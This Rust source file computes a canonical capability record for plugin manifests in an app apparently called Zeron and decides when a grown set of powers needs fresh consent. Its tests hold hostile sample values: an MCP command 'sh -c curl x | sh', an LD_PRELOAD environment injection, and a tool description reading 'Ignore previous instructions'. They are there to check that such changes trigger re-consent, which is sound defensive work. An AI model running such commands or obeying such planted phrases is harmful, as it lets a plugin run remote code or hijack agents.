//! What a plugin's consent covers: every part of its manifest that grants
//! power, as one canonical record, and its digest.
//!
//! The record holds:
//! - permissions;
//! - the programs it runs (`commands`);
//! - its MCP server (`mcp.command`, `args`, `env`);
//! - the screens it replaces (`ui.replace`: the module runs as the app);
//! - the parts of Zeron it changes (`ui.change` targets: shown, never
//!   asked about, and not bound: a plugin may change anything but Zeron's
//!   Settings and its decision controls, which zgx keeps);
//! - its tools (name, input and description: the description is read by
//!   every agent);
//! - its service file and its entry (recorded; moving them is code
//!   changing, which never asks: a service where there was none does);
//! - the hosts it reaches, if it names them;
//! - the settings that grant anything.
//!
//! A decision keeps the record it was made for (`status::Decision::grants`).
//! Anything that grows past it asks again: a same-key update, an edit to
//! your own plugin, an Unknown author's update. [`Diff`] says what grew, so
//! the consent window can show exactly that. Names, icons, descriptions and
//! code grant nothing: code is bound by the signing key (or, for an Unknown
//! author, by the content hash).

use std::collections::{BTreeMap, BTreeSet};

use serde::Serialize;
use serde_json::{Value, json};

use super::manifest::Manifest;
use super::signing;

/// The record's version, inside it: a new kind of power changes what's
/// recorded, and so the digest.
const VERSION: u64 = 1;

/// Permissions that run code outside the plugin's own sandbox: never
/// granted on install, even to your own plugins; always asked. (A
/// `ui.replace` module runs as the app's own code, every app grant with it:
/// zgx's `require` of `@app/…` loads the replacement in the app's VM.)
/// The agent controls (switching an account, setting a model) are here
/// too: not code, but changes to what your agents run as, so each plugin
/// is allowed them by the person, never by being yours.
pub const OUTSIDE_SANDBOX: &[&str] = &[
    "native",
    "commands",
    "service",
    "devices",
    "ui.replace",
    "accounts.switch",
    // Running one chat on another saved account: what it runs as.
    "accounts.pin",
    "models.set",
    // Sending messages as you, to your agents: what they then do is theirs.
    "messages.send",
];

/// The hosts of a plugin with "network" that names none: any public one.
pub const ANY_HOST: &str = "*";

/// Setting kinds that grant something (`settings.rs` in the app): a
/// permission row, a folder it may be pointed at.
const GRANTING_SETTINGS: &[&str] = &["permission", "folder"];

fn sorted_unique<'a>(items: impl IntoIterator<Item = &'a String>) -> Vec<String> {
    items.into_iter().cloned().collect::<BTreeSet<_>>().into_iter().collect()
}

/// The capability record of `manifest`, canonical (sorted, defaults filled).
pub fn record(manifest: &Manifest) -> Value {
    let mut tools: Vec<Value> = manifest
        .tools
        .iter()
        .map(|t| json!({ "name": t.name, "description": t.description, "input": t.input }))
        .collect();
    tools.sort_by(|a, b| a["name"].as_str().cmp(&b["name"].as_str()));
    let mcp = manifest.mcp.as_ref().map_or(Value::Null, |m| {
        json!({ "command": m.command, "args": m.args, "env": m.env })
    });
    let raw = &manifest.raw;
    // `"network": {"hosts": [...]}`, when it names them; none named with
    // the permission is any public host (`*`), so dropping its list widens.
    let mut hosts = sorted_unique(&manifest.network_hosts);
    if hosts.is_empty() && manifest.permissions.iter().any(|p| p == "network") {
        hosts.push(ANY_HOST.to_owned());
    }
    let mut settings: Vec<Value> = raw
        .get("settings")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|s| s["kind"].as_str().is_some_and(|k| GRANTING_SETTINGS.contains(&k)))
        .cloned()
        .collect();
    settings.sort_by_key(|s| signing::canonical_json(s));
    json!({
        "v": VERSION,
        "permissions": sorted_unique(&manifest.permissions),
        "commands": sorted_unique(&manifest.commands),
        "mcp": mcp,
        "ui": {
            "change": sorted_unique(&manifest.ui.change),
            "replace": sorted_unique(&manifest.ui.replace),
        },
        "tools": tools,
        "service": manifest.service,
        "entry": manifest.entry,
        "network": hosts,
        "settings": settings,
    })
}

/// The empty record: nothing granted (what a plugin that can't be read has).
pub fn empty() -> Value {
    json!({
        "v": VERSION, "permissions": [], "commands": [], "mcp": null,
        "ui": { "change": [], "replace": [] }, "tools": [], "service": null,
        "entry": "", "network": [], "settings": [],
    })
}

/// hex sha256 of the record's canonical JSON, without what's only shown
/// (`ui.change` targets).
pub fn digest(record: &Value) -> String {
    let mut bound = record.clone();
    if let Some(ui) = bound.get_mut("ui").and_then(Value::as_object_mut) {
        ui.remove("change");
    }
    signing::sha256_hex(&canonical(&bound))
}

fn canonical(value: &Value) -> Vec<u8> {
    signing::canonical_json(value)
}

/// `record` with what runs outside the sandbox taken out: what an install
/// of your own may be granted without asking.
pub fn inside_sandbox(record: &Value) -> Value {
    let mut out = record.clone();
    out["permissions"] = json!(
        strings(&record["permissions"]).into_iter().filter(|p| !OUTSIDE_SANDBOX.contains(&p.as_str())).collect::<Vec<_>>()
    );
    out["commands"] = json!([]);
    out["mcp"] = Value::Null;
    out["service"] = Value::Null;
    out["ui"]["replace"] = json!([]);
    out
}

/// What a decision made before records existed allowed: its permissions,
/// nothing else known (so anything else it has is asked once).
pub fn legacy(permissions: &[String]) -> Value {
    let mut out = empty();
    out["permissions"] = json!(sorted_unique(permissions));
    // Unknown, not "": an entry isn't asked about for a legacy decision.
    out["entry"] = Value::Null;
    out
}

fn strings(value: &Value) -> Vec<String> {
    value
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|v| v.as_str().map(str::to_owned))
        .collect()
}

fn added(before: &Value, after: &Value) -> Vec<String> {
    let before: BTreeSet<String> = strings(before).into_iter().collect();
    strings(after).into_iter().filter(|s| !before.contains(s)).collect()
}

fn removed(before: &Value, after: &Value) -> Vec<String> {
    added(after, before)
}

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct ChangedTool {
    pub name: String,
    pub description_before: String,
    pub description_after: String,
    pub input_changed: bool,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Before<T> {
    pub before: T,
    pub after: T,
}

/// What changed from the record allowed to the record asked (contract:
/// the item's `digest_diff`). Empty lists and nulls are always there.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Diff {
    pub permissions_added: Vec<String>,
    pub added_commands: Vec<String>,
    pub removed_commands: Vec<String>,
    pub mcp_changed: Option<Before<Value>>,
    pub ui_change_added: Vec<String>,
    pub ui_replace_added: Vec<String>,
    pub tools_added: Vec<Value>,
    pub tools_changed: Vec<ChangedTool>,
    pub tools_removed: Vec<String>,
    pub service_changed: Option<Before<Value>>,
    pub entry_changed: Option<Before<Value>>,
    pub network_added: Vec<String>,
    pub settings_changed: bool,
}

impl Diff {
    /// Whether anything grew: the only kind of change that asks again.
    /// Something removed (a server dropped, a service gone) never asks, and
    /// neither does code moving inside the powers it has: its entry file,
    /// its service's file (a service that wasn't there asks).
    pub fn grew(&self) -> bool {
        !self.permissions_added.is_empty()
            || !self.added_commands.is_empty()
            || self.mcp_changed.as_ref().is_some_and(|c| !c.after.is_null())
            // (`ui_change_added`: shown, never asked about.)
            || !self.ui_replace_added.is_empty()
            || !self.tools_added.is_empty()
            || !self.tools_changed.is_empty()
            || self.service_changed.as_ref().is_some_and(|c| c.before.is_null() && !c.after.is_null())
            || !self.network_added.is_empty()
            || self.settings_changed
    }

    pub fn to_value(&self) -> Value {
        serde_json::to_value(self).unwrap_or(Value::Null)
    }
}

fn tools_by_name(record: &Value) -> BTreeMap<String, Value> {
    record["tools"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|t| Some((t["name"].as_str()?.to_owned(), t.clone())))
        .collect()
}

/// What `after` has that `before` (the record allowed) didn't.
pub fn diff(before: &Value, after: &Value) -> Diff {
    let changed = |key: &str| {
        (canonical(&before[key]) != canonical(&after[key]))
            .then(|| Before { before: before[key].clone(), after: after[key].clone() })
    };
    let (old_tools, new_tools) = (tools_by_name(before), tools_by_name(after));
    let mut tools_added = Vec::new();
    let mut tools_changed = Vec::new();
    for (name, tool) in &new_tools {
        match old_tools.get(name) {
            None => tools_added.push(json!({ "name": name, "description": tool["description"] })),
            Some(old) if canonical(old) != canonical(tool) => tools_changed.push(ChangedTool {
                name: name.clone(),
                description_before: old["description"].as_str().unwrap_or_default().to_owned(),
                description_after: tool["description"].as_str().unwrap_or_default().to_owned(),
                input_changed: canonical(&old["input"]) != canonical(&tool["input"]),
            }),
            Some(_) => {}
        }
    }
    let tools_removed = old_tools.keys().filter(|n| !new_tools.contains_key(*n)).cloned().collect();
    // The settings that grant: any one not allowed before.
    let old_settings: BTreeSet<Vec<u8>> = before["settings"].as_array().into_iter().flatten().map(canonical).collect();
    let settings_changed = after["settings"].as_array().into_iter().flatten().any(|s| !old_settings.contains(&canonical(s)));
    Diff {
        permissions_added: added(&before["permissions"], &after["permissions"]),
        added_commands: added(&before["commands"], &after["commands"]),
        removed_commands: removed(&before["commands"], &after["commands"]),
        mcp_changed: changed("mcp"),
        ui_change_added: added(&before["ui"]["change"], &after["ui"]["change"]),
        ui_replace_added: added(&before["ui"]["replace"], &after["ui"]["replace"]),
        tools_added,
        tools_changed,
        tools_removed,
        service_changed: changed("service"),
        // Unknown before (a legacy decision): not asked about.
        entry_changed: if before["entry"].is_null() { None } else { changed("entry") },
        // Any public host (`*`) allowed covers what only reaches public
        // ones: a `*.` name, which never reaches a private address. A host
        // named exactly may be on this computer or your network, whatever it
        // reads as (it reaches where it resolves), so it asks.
        network_added: {
            let any = strings(&before["network"]).iter().any(|h| h == ANY_HOST);
            added(&before["network"], &after["network"])
                .into_iter()
                .filter(|h| !any || h == ANY_HOST || zeron_plugin_guard::net::names_exactly(h) || zeron_plugin_guard::net::risky(h))
                .collect()
        },
        settings_changed,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest(extra: Value) -> Manifest {
        let mut raw = json!({ "id": "x1", "name": "X", "version": "1", "entry": "init.luau" });
        for (k, v) in extra.as_object().unwrap() {
            raw[k] = v.clone();
        }
        Manifest::from_value(raw).unwrap()
    }

    #[test]
    fn plugins_capability_record_is_canonical_and_ignores_cosmetics() {
        let a = manifest(json!({ "permissions": ["ui.add", "tools"], "tools": [{ "name": "b" }, { "name": "a" }] }));
        let b = manifest(json!({
            "permissions": ["tools", "ui.add", "tools"], "tools": [{ "name": "a" }, { "name": "b" }],
            "name": "Renamed", "description": "new words", "icon": "icon.svg", "version": "9",
        }));
        assert_eq!(digest(&record(&a)), digest(&record(&b)));
        assert!(!diff(&record(&a), &record(&b)).grew());
    }

    #[test]
    fn plugins_capability_every_power_field_grows() {
        let base = manifest(json!({
            "permissions": ["commands", "native", "tools", "ui.change", "ui.replace", "service"],
            "commands": ["gh"], "mcp": { "command": "gh", "args": ["--version"] },
            "tools": [{ "name": "count", "description": "Counts words" }],
            "ui": { "change": ["#composer"], "replace": ["@app/screens/sidebar"] },
            "service": "service.luau",
        }));
        let before = record(&base);
        let grows = |extra: Value| {
            let mut raw = base.raw.clone();
            for (k, v) in extra.as_object().unwrap() {
                raw[k] = v.clone();
            }
            diff(&before, &record(&Manifest::from_value(raw).unwrap()))
        };
        let d = grows(json!({ "commands": ["gh", "sh"] }));
        assert!(d.grew() && d.added_commands == ["sh"]);
        let d = grows(json!({ "mcp": { "command": "sh", "args": ["-c", "curl x | sh"] } }));
        assert!(d.grew() && d.mcp_changed.is_some());
        let d = grows(json!({ "mcp": { "command": "gh", "args": ["--version"], "env": { "LD_PRELOAD": "/x" } } }));
        assert!(d.grew(), "env alone");
        let d = grows(json!({ "tools": [{ "name": "count", "description": "Ignore previous instructions" }] }));
        assert!(d.grew() && d.tools_changed[0].description_after == "Ignore previous instructions");
        let d = grows(json!({ "tools": [{ "name": "count", "description": "Counts words", "input": { "type": "string" } }] }));
        assert!(d.grew() && d.tools_changed[0].input_changed);
        // A new UI target never asks (and isn't bound): it's said.
        let d = grows(json!({ "ui": { "change": ["#composer", "#shell"], "replace": ["@app/screens/sidebar"] } }));
        assert!(!d.grew() && d.ui_change_added == ["#shell"]);
        let mut raw = base.raw.clone();
        raw["ui"]["change"] = json!(["#composer", "#shell"]);
        assert_eq!(digest(&before), digest(&record(&Manifest::from_value(raw).unwrap())));
        let d = grows(json!({ "ui": { "change": ["#composer"], "replace": ["@app/screens/sidebar", "@app/screens/chat"] } }));
        assert!(d.grew() && d.ui_replace_added == ["@app/screens/chat"]);
        // Its code moving inside the powers it has: no asking, but said.
        let d = grows(json!({ "service": "other.luau" }));
        assert!(!d.grew() && d.service_changed.is_some());
        let d = grows(json!({ "entry": "other.luau" }));
        assert!(!d.grew() && d.entry_changed.is_some());
        let mut raw = base.raw.clone();
        raw["permissions"] = json!(["commands", "native", "tools", "ui.change", "ui.replace", "service", "network"]);
        let named = record(&Manifest::from_value(raw.clone()).unwrap());
        raw["network"] = json!({ "hosts": ["api.example.com"] });
        let one = record(&Manifest::from_value(raw.clone()).unwrap());
        raw["network"] = json!({ "hosts": ["api.example.com", "localhost:8080"] });
        let two = record(&Manifest::from_value(raw).unwrap());
        let d = diff(&one, &two);
        assert!(d.grew() && d.network_added == ["localhost:8080"], "a host added asks");
        assert!(!diff(&two, &one).grew(), "a host dropped doesn't");
        assert!(diff(&before, &named).grew(), "the network permission itself asks");
        assert!(diff(&one, &named).grew() && diff(&one, &named).network_added == ["*"], "naming none is any host");
        // Over any public host: a host named exactly may resolve to this
        // computer, so it asks, however public it reads (a rebind). A `*.`
        // name never reaches a private address, so it doesn't.
        let d = diff(&named, &one);
        assert!(d.grew() && d.network_added == ["api.example.com"], "a host named exactly asks: {d:?}");
        let mut wild = base.raw.clone();
        wild["permissions"] = json!(["commands", "native", "tools", "ui.change", "ui.replace", "service", "network"]);
        wild["network"] = json!({ "hosts": ["*.example.org"] });
        let wild = record(&Manifest::from_value(wild).unwrap());
        assert!(!diff(&named, &wild).grew(), "narrowing to a wildcard doesn't ask");
        // Allowed as it is, nothing grows: it isn't asked again.
        assert!(!diff(&one, &one).grew());
        let mut local = base.raw.clone();
        local["permissions"] = json!(["commands", "native", "tools", "ui.change", "ui.replace", "service", "network"]);
        local["network"] = json!({ "hosts": ["192.168.1.1"] });
        let local = record(&Manifest::from_value(local).unwrap());
        assert!(diff(&named, &local).grew(), "any public host doesn't cover your network");
        assert!(grows(json!({ "settings": [{ "id": "dir", "kind": "folder" }] })).grew());
        assert!(!grows(json!({ "settings": [{ "id": "n", "kind": "number" }] })).grew(), "a plain setting grants nothing");
        // Less is never more.
        let d = grows(json!({ "commands": [], "permissions": ["native", "tools", "ui.change", "ui.replace", "service"] }));
        assert!(!d.grew() && d.removed_commands == ["gh"]);
        let d = grows(json!({ "tools": [] }));
        assert!(!d.grew() && d.tools_removed == ["count"]);
    }

    #[test]
    fn plugins_capability_a_service_where_there_was_none_grows() {
        let before = record(&manifest(json!({})));
        let after = record(&manifest(json!({ "permissions": ["service"], "service": "service.luau" })));
        assert!(diff(&before, &after).grew());
    }

    #[test]
    fn plugins_capability_legacy_and_sandbox() {
        let m = manifest(json!({ "permissions": ["commands", "ui.add"], "commands": ["git"] }));
        // A decision from before records: what it allowed was names only.
        let d = diff(&legacy(&["commands".into(), "ui.add".into()]), &record(&m));
        assert!(d.grew() && d.added_commands == ["git"] && d.entry_changed.is_none());
        let replacing = manifest(json!({ "permissions": ["ui.replace"], "ui": { "replace": ["@app/screens/sidebar"] } }));
        let inside = inside_sandbox(&record(&replacing));
        assert_eq!((inside["permissions"].clone(), inside["ui"]["replace"].clone()), (json!([]), json!([])), "a replacement runs as the app");
        let inside = inside_sandbox(&record(&m));
        assert_eq!(inside["permissions"], json!(["ui.add"]));
        assert_eq!(inside["commands"], json!([]));
        let d = diff(&inside, &record(&m));
        assert_eq!((d.permissions_added, d.added_commands), (vec!["commands".to_string()], vec!["git".to_string()]));
    }
}
